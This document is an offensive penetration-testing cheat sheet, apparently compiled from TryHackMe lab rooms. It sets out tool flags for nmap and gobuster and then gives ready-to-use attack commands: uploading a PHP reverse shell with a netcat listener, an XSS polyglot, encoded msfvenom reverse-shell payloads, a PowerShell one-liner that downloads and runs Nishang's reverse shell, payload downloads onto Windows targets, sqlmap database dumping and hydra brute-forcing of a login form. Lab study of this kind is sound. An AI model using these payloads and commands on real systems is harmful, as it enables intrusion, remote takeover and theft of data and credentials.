# offensive pentesting

## nmap

| Nmap Flag  | Description                                                               |
|------------|---------------------------------------------------------------------------|
| `-sV`      | Attempts to determine the version of the services running                 |
| `-p <x>` or `-p-` | Port scan for port `<x>` or scan all ports                           |
| `-Pn`      | Disable host discovery and scan for open ports                            |
| `-A`       | Enables OS and version detection, executes in-build scripts for further enumeration |
| `-sC`      | Scan with the default Nmap scripts                                        |
| `-v`       | Verbose mode                                                              |
| `-sU`      | UDP port scan                                                             |
| `-sS`      | TCP SYN port scan                                                         |

## gobuster
- `/usr/share/wordlists/dirbuster/directory-list-1.0.txt`
- `gobuster dir -u http://10.10.105.49:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt`
- `gobuster dir -u http://10.10.105.49:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` 

| Gobuster Flag | Description                                           |
|---------------|-------------------------------------------------------|
| `-e`          | Print the full URLs in your console                   |
| `-u`          | The target URL                                        |
| `-w`          | Path to your wordlist                                 |
| `-U` and `-P` | Username and Password for Basic Auth                  |
| `-p <x>`      | Proxy to use for requests                             |
| `-c <http cookies>` | Specify a cookie for simulating your auth       |

## gaining reverse shell
Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to uploadable url in the browser of your TryHackMe connected device).
Rename this file to `php-reverse-shell.phtml`.
We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp 1234`.
Upload your shell and navigate to `http://10.10.105.49:3333/internal/uploads/php-reverse-shell.phtml` - This will execute your payload.
- reverse shell php `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php`
- to find the users in the target `cat /etc/passwd`.

## XSS
Polyglots:

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
## privilege escalastion
- metasploit payload
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.152.30 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
ncat.exe
```
https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
```
## command execution in http server

- nishang - `Invoke-PowershellTcp.ps1`.
```
git clone https://github.com/samratashok/nishang.git
```
- now run  `cp /nishang/Shells/Invoke-PowerShellTcp.ps1 .`.
- add `Invoke-PowerShellTcp -Reverse -IPAddress <AIP> -Port <APORT>` at the bottom of the file.
```
powershell iex (New-Object Net.WebClient).DownloadString('http://<AIP>:APORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <AIP> -Port <APORT>
```
### metasploit

payload - `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`
- After creating this payload, download it to the machine using the same method in the previous step:
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
```
- now open metasploit and use the pathways
- `use exploit/multi/handler`
- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `set LHOST your-thm-ip`
- `set LPORT listening-port`
- `run`

#### another method
- Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).
- This access token consists of:
1. User SIDs(security identifier)
2. Group SIDs
3. Privileges


## winpeas payloads
```
https://github.com/peass-ng/PEASS-ng/releases/tag/20231203-9cdcb38f
```

## metasploit payloads and windows privilege escation - hackpark
- payload - `windows/x64/meterpreter/reverse_tcp`
- netcat listner is metasploit `use /exploit/multi/handler`
- windows target machine file download command
```
powershell -c "Invoke-WebRequest -Uri 'http://10.10.217.244:8080/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'
```
## sqlmap
We're going to use SQLMap to dump the entire database for GameZone.

Using the page we logged into earlier, we're going point SQLMap to the game review search feature.

First we need to intercept a request made to the search feature using BurpSuite.

 

Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.

![image](https://github.com/user-attachments/assets/15182ce7-b636-4b69-ba90-d4913350c064)

- `-r` uses the intercepted request you saved earlier
- `--dbms` tells SQLMap what type of database management system it is
- `--dump` attempts to outputs the entire database



SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.

## HYDRA USAGE

```
hydra -l milesdyson -P log1.txt 10.10.174.36 -V http-form-post ‘/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.’
```

| Command | Description                                                                                      |
|---------|--------------------------------------------------------------------------------------------------|
| `-l <username>` | Specify the username                                                                     |
| `-P <password wordlist>` | Specify the password wordlist                                                   |
| `-V` | Enable verbose mode                                                                                 |
| `http-form-post` | Specify the HTTP POST form for the request                                              |
| `'/squirrelmail/src/redirect.php:` | Path to redirect after authentication                                 |
| `login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:` | Payload response key found in `Inspect > Network > Payload > Use Raw` |
| `F=Unknown User or password incorrect.` | Output message for incorrect passwords                           |
